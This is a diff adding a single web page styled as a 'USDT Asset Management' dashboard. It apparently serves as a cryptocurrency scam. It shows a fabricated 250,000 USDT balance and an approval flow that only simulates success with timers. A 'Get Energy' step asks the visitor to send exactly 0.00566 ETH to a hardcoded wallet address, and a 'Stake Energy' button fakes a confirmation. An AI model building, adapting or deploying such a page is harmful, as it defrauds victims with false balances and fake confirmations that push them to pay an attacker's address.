@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>USDT Asset Management</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+
+body{
+  font-family:Arial,Helvetica,sans-serif;
+  background:#07111d;
+  color:#fff;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
+}
+
+/* ── MAIN CARD ── */
+.app{
+  width:100%;max-width:440px;
+  background:#0d1b2a;
+  border:1px solid rgba(255,255,255,.08);
+  border-radius:24px;
+  padding:24px;
+  box-shadow:0 20px 60px rgba(0,0,0,.35);
+}
+
+h1{font-size:25px;margin-bottom:8px}
+
+.subtitle{
+  color:#91a4b8;font-size:14px;
+  line-height:1.5;margin-bottom:22px;
+}
+
+.asset-card{
+  background:linear-gradient(135deg,#123528,#0b211b);
+  border:1px solid rgba(40,200,140,.18);
+  border-radius:18px;
+  padding:20px;margin-bottom:18px;
+}
+
+.asset-header{display:flex;align-items:center;gap:12px}
+
+.usdt-logo{
+  width:48px;height:48px;border-radius:50%;
+  background:#26a17b;
+  display:flex;justify-content:center;align-items:center;
+  font-weight:800;font-size:23px;
+}
+
+.asset-name{font-size:17px;font-weight:700}
+.asset-network{color:#91b7a9;font-size:12px;margin-top:4px}
+
+.balance{margin-top:22px;font-size:30px;font-weight:800}
+.balance span{font-size:15px;color:#9db3aa;margin-left:5px}
+
+.status{margin-top:9px;color:#54d49d;font-size:13px}
+
+/* ── BUTTONS ── */
+button{
+  width:100%;border:0;border-radius:13px;
+  padding:15px;font-size:15px;font-weight:700;
+  cursor:pointer;transition:.2s;
+}
+button:active{transform:scale(.98)}
+button:hover{filter:brightness(1.1)}
+
+.approve-btn{background:#26a17b;color:#fff;margin-bottom:10px}
+.energy-btn{background:#16283a;color:#fff;border:1px solid #263c50}
+
+.approved-btn{
+  background:rgba(38,161,123,.12);
+  color:#54d49d;
+  border:1px solid rgba(38,161,123,.35);
+  margin-bottom:10px;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  cursor:default;
+  pointer-events:none;
+}
+.approved-btn:hover{filter:none}
+.copy-btn{background:#172a3d;color:#fff;margin-bottom:9px}
+.stake-btn{
+  background:linear-gradient(135deg,#1a3a5c,#0f2640);
+  color:#fff;border:1px solid #2a4a6a;
+  margin-bottom:9px;
+}
+.back-btn{
+  background:transparent;color:#8ea1b3;
+  padding:10px;font-size:13px;
+}
+
+/* ── OVERLAY / MODAL ── */
+.overlay{
+  position:fixed;inset:0;
+  background:rgba(0,0,0,.72);
+  backdrop-filter:blur(7px);
+  display:none;align-items:center;
+  justify-content:center;
+  padding:20px;z-index:100;
+}
+.overlay.active{display:flex}
+
+.modal{
+  width:100%;max-width:410px;
+  background:#0e1c2b;
+  border:1px solid rgba(255,255,255,.09);
+  border-radius:22px;
+  padding:24px;
+  position:relative;
+  animation:popup .22s ease;
+}
+
+@keyframes popup{
+  from{opacity:0;transform:translateY(15px) scale(.97)}
+  to  {opacity:1;transform:translateY(0)    scale(1)}
+}
+
+.close{
+  position:absolute;right:18px;top:15px;
+  width:34px;height:34px;border-radius:50%;
+  background:#17283a;color:#fff;
+  padding:0;font-size:20px;
+}
+
+.modal h2{font-size:21px;margin-bottom:8px}
+.modal-description{
+  color:#8da0b3;font-size:13px;
+  line-height:1.5;margin-bottom:20px;
+}
+
+.info-box{
+  background:#101f30;
+  border:1px solid #24384c;
+  border-radius:15px;
+  padding:18px;margin-bottom:16px;
+}
+.info-label{color:#8fa2b5;font-size:12px;margin-bottom:7px}
+.info-value{font-size:25px;font-weight:800}
+.info-value small{font-size:14px;color:#9caebe}
+
+/* ── SPINNER STATE ── */
+.spinner-wrap{
+  display:none;
+  flex-direction:column;
+  align-items:center;
+  padding:30px 0 20px;
+  gap:18px;
+}
+.spinner-wrap.active{display:flex}
+
+.spinner{
+  width:64px;height:64px;
+  border:5px solid rgba(38,161,123,.2);
+  border-top-color:#26a17b;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.spinner-text{color:#8da0b3;font-size:14px}
+
+/* ── SUCCESS STATE ── */
+.success-wrap{
+  display:none;
+  flex-direction:column;
+  align-items:center;
+  padding:20px 0;
+  gap:14px;
+  text-align:center;
+}
+.success-wrap.active{display:flex}
+
+.success-icon{
+  width:72px;height:72px;border-radius:50%;
+  background:rgba(38,161,123,.15);
+  border:2px solid #26a17b;
+  display:flex;align-items:center;justify-content:center;
+  font-size:34px;
+  animation:pop .35s cubic-bezier(.34,1.56,.64,1);
+}
+@keyframes pop{
+  from{transform:scale(0);opacity:0}
+  to  {transform:scale(1);opacity:1}
+}
+
+.success-title{font-size:20px;font-weight:800;color:#54d49d}
+.success-sub{color:#8da0b3;font-size:13px;line-height:1.5}
+
+/* ── QR SECTION ── */
+.qr-section{text-align:center}
+
+.qr-wrapper{
+  width:210px;height:210px;
+  background:#fff;
+  border-radius:15px;padding:10px;
+  margin:5px auto 18px;
+  display:flex;align-items:center;justify-content:center;
+  position:relative;
+}
+.qr-wrapper img{width:100%;height:100%;object-fit:contain}
+
+/* QR loading skeleton */
+.qr-skeleton{
+  position:absolute;inset:10px;
+  border-radius:8px;
+  background:linear-gradient(90deg,#1a2d3d 25%,#243d52 50%,#1a2d3d 75%);
+  background-size:200% 100%;
+  animation:shimmer 1.2s infinite;
+}
+@keyframes shimmer{
+  0%  {background-position:200% 0}
+  100%{background-position:-200% 0}
+}
+
+.address-label{color:#8fa2b5;font-size:12px;margin-bottom:7px}
+.address{
+  background:#091521;
+  border:1px solid #24384c;
+  border-radius:10px;
+  padding:12px;font-size:11px;
+  line-height:1.5;word-break:break-all;
+  color:#dbe6ef;margin-bottom:12px;
+}
+
+/* stake divider */
+.divider{
+  display:flex;align-items:center;
+  gap:10px;margin:4px 0 12px;
+}
+.divider-line{flex:1;height:1px;background:rgba(255,255,255,.08)}
+.divider-text{color:#5a7a94;font-size:11px}
+
+/* stake icon row */
+.stake-icon-row{
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:4px;
+}
+.stake-icon{
+  width:32px;height:32px;border-radius:50%;
+  background:linear-gradient(135deg,#1a3a5c,#0f2640);
+  border:1px solid #2a4a6a;
+  display:flex;align-items:center;justify-content:center;
+  font-size:15px;flex-shrink:0;
+}
+
+/* ── GET ENERGY SPINNER / SUCCESS ── */
+.energy-spinner-wrap{
+  display:none;flex-direction:column;
+  align-items:center;padding:30px 0 20px;gap:18px;
+}
+.energy-spinner-wrap.active{display:flex}
+
+.energy-success-wrap{
+  display:none;flex-direction:column;
+  align-items:center;padding:20px 0;
+  gap:14px;text-align:center;
+}
+.energy-success-wrap.active{display:flex}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════ MAIN ══ -->
+<div class="app">
+  <h1>USDT Asset Management</h1>
+  <p class="subtitle">Manage and review your USDT asset authorization status.</p>
+
+  <div class="asset-card">
+    <div class="asset-header">
+      <div class="usdt-logo">₮</div>
+      <div>
+        <div class="asset-name">Tether USD</div>
+        <div class="asset-network">USDT Asset • TRC-20</div>
+      </div>
+    </div>
+    <div class="balance">250,000.00 <span>USDT</span></div>
+    <div class="status">● Asset available for management</div>
+  </div>
+
+  <button class="approve-btn" id="mainApproveBtn" onclick="openApproval()">Approve USDT Asset</button>
+  <button class="energy-btn" onclick="openEnergy()">Get Energy</button>
+</div>
+
+
+<!-- ══════════════════════════ APPROVE MODAL ══ -->
+<div class="overlay" id="approvalModal">
+  <div class="modal">
+    <button class="close" onclick="closeModal('approvalModal')">×</button>
+
+    <!-- default view -->
+    <div id="approveDefault">
+      <h2>Approve USDT Asset</h2>
+      <p class="modal-description">Authorize this asset for management and transfer operations.</p>
+
+      <div class="info-box">
+        <div class="info-label">Asset</div>
+        <div class="info-value">USDT <small>• TRC-20</small></div>
+      </div>
+
+      <button class="approve-btn" onclick="startApproval()">Confirm Approval</button>
+      <button class="back-btn" onclick="closeModal('approvalModal')">Cancel</button>
+    </div>
+
+    <!-- spinner -->
+    <div class="spinner-wrap" id="approveSpinner">
+      <div class="spinner"></div>
+      <div class="spinner-text">Processing approval…</div>
+    </div>
+
+    <!-- success -->
+    <div class="success-wrap" id="approveSuccess">
+      <div class="success-icon">✓</div>
+      <div class="success-title">Approved Successfully</div>
+      <div class="success-sub">
+        Your USDT asset has been authorized for management and transfer operations.
+      </div>
+      <button class="approve-btn" style="margin-top:8px" onclick="finishApproval()">Done</button>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════ ENERGY MODAL ══ -->
+<div class="overlay" id="energyModal">
+  <div class="modal">
+    <button class="close" onclick="closeModal('energyModal')">×</button>
+
+    <!-- default view -->
+    <div id="energyDefault">
+      <h2>Get Energy</h2>
+      <p class="modal-description">Send the required amount to activate energy for USDT asset management.</p>
+
+      <div class="info-box">
+        <div class="info-label">Required top-up amount</div>
+        <div class="info-value">0.00566 <small>ETH</small></div>
+      </div>
+
+      <button class="approve-btn" onclick="showQR()">View Deposit Address</button>
+      <button class="back-btn" onclick="closeModal('energyModal')">Cancel</button>
+    </div>
+
+    <!-- spinner (energy) -->
+    <div class="energy-spinner-wrap" id="energySpinner">
+      <div class="spinner"></div>
+      <div class="spinner-text">Activating energy…</div>
+    </div>
+
+    <!-- success (energy) -->
+    <div class="energy-success-wrap" id="energySuccess">
+      <div class="success-icon">⚡</div>
+      <div class="success-title">Energy Activated</div>
+      <div class="success-sub">
+        Energy has been successfully staked and assigned to your USDT asset.
+      </div>
+      <button class="approve-btn" style="margin-top:8px" onclick="closeModal('energyModal')">Done</button>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════ QR MODAL ══ -->
+<div class="overlay" id="qrModal">
+  <div class="modal qr-section">
+    <button class="close" onclick="closeModal('qrModal')">×</button>
+
+    <h2>Deposit Address</h2>
+    <p class="modal-description">Send exactly <strong style="color:#fff">0.00566 ETH</strong> to the address below to activate energy.</p>
+
+    <!-- QR -->
+    <div class="qr-wrapper">
+      <div class="qr-skeleton" id="qrSkeleton"></div>
+      <img id="qrImage" alt="Wallet QR Code" style="opacity:0;transition:opacity .3s" onload="revealQR()">
+    </div>
+
+    <div class="address-label">Wallet address</div>
+    <div class="address" id="walletAddressDisplay">
+      0x8f45d779b1d21c2556501f776e2cdbbc0f7a86a1
+    </div>
+
+    <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
+
+    <!-- divider + stake -->
+    <div class="divider">
+      <div class="divider-line"></div>
+      <div class="divider-text">OR</div>
+      <div class="divider-line"></div>
+    </div>
+
+    <div class="stake-icon-row">
+      <div class="stake-icon">⚡</div>
+      <div style="text-align:left">
+        <div style="font-size:13px;font-weight:700">Stake Energy</div>
+        <div style="font-size:11px;color:#5a7a94">Directly stake bandwidth &amp; energy to your wallet</div>
+      </div>
+    </div>
+
+    <button class="stake-btn" onclick="stakeEnergy()">Stake Energy</button>
+    <button class="back-btn" onclick="closeModal('qrModal')">Close</button>
+  </div>
+</div>
+
+
+<script>
+const walletAddress = "0x8f45d779b1d21c2556501f776e2cdbbc0f7a86a1";
+
+/* ── helpers ── */
+function show(id){ document.getElementById(id).classList.add("active") }
+function hide(id){ document.getElementById(id).classList.remove("active") }
+function displayBlock(id){ document.getElementById(id).style.display = "flex" }
+function hideBlock(id)   { document.getElementById(id).style.display = "none"  }
+
+function openApproval(){ show("approvalModal") }
+function openEnergy()  { show("energyModal") }
+
+let usdtApproved = false;
+
+function closeModal(id){
+  hide(id);
+  // reset approval modal only if not yet approved
+  if(id === "approvalModal" && !usdtApproved){
+    document.getElementById("approveDefault").style.display = "block";
+    document.getElementById("approveSpinner").classList.remove("active");
+    document.getElementById("approveSuccess").classList.remove("active");
+  }
+  // reset energy modal
+  if(id === "energyModal"){
+    document.getElementById("energyDefault").style.display = "block";
+    document.getElementById("energySpinner").classList.remove("active");
+    document.getElementById("energySuccess").classList.remove("active");
+  }
+}
+
+/* ── APPROVAL FLOW ── */
+function startApproval(){
+  document.getElementById("approveDefault").style.display = "none";
+  document.getElementById("approveSpinner").classList.add("active");
+
+  setTimeout(()=>{
+    document.getElementById("approveSpinner").classList.remove("active");
+    document.getElementById("approveSuccess").classList.add("active");
+  }, 2400);
+}
+
+function finishApproval(){
+  usdtApproved = true;
+  closeModal("approvalModal");
+
+  // swap main button to approved state
+  const btn = document.getElementById("mainApproveBtn");
+  btn.className = "approved-btn";
+  btn.onclick = null;
+  btn.innerHTML = `<span style="font-size:18px">✓</span> USDT Approved`;
+}
+
+/* ── ENERGY → QR FLOW ── */
+function showQR(){
+  // load QR
+  const qrURL = "https://api.qrserver.com/v1/create-qr-code/?size=500x500&data="
+    + encodeURIComponent(walletAddress);
+  document.getElementById("qrImage").src = qrURL;
+  document.getElementById("qrImage").style.opacity = "0";
+  document.getElementById("qrSkeleton").style.display = "block";
+  document.getElementById("walletAddressDisplay").textContent = walletAddress;
+
+  hide("energyModal");
+  show("qrModal");
+}
+
+function revealQR(){
+  document.getElementById("qrSkeleton").style.display = "none";
+  document.getElementById("qrImage").style.opacity = "1";
+}
+
+/* ── STAKE ENERGY FLOW ── */
+function stakeEnergy(){
+  hide("qrModal");
+  show("energyModal");
+
+  document.getElementById("energyDefault").style.display = "none";
+  document.getElementById("energySpinner").classList.add("active");
+
+  setTimeout(()=>{
+    document.getElementById("energySpinner").classList.remove("active");
+    document.getElementById("energySuccess").classList.add("active");
+  }, 2600);
+}
+
+/* ── COPY ADDRESS ── */
+async function copyAddress(){
+  const btn = document.querySelector("#qrModal .copy-btn");
+  try {
+    await navigator.clipboard.writeText(walletAddress);
+    const old = btn.textContent;
+    btn.textContent = "Address Copied ✓";
+    setTimeout(()=>{ btn.textContent = old }, 1600);
+  } catch(e){
+    alert("Address:\n\n" + walletAddress);
+  }
+}
+
+/* click outside closes */
+document.querySelectorAll(".overlay").forEach(o=>{
+  o.addEventListener("click", e=>{ if(e.target===o) o.classList.remove("active") });
+});
+
+/* ESC closes */
+document.addEventListener("keydown", e=>{
+  if(e.key==="Escape")
+    document.querySelectorAll(".overlay").forEach(m=>m.classList.remove("active"));
+});
+</script>
+</body>
+  </html>
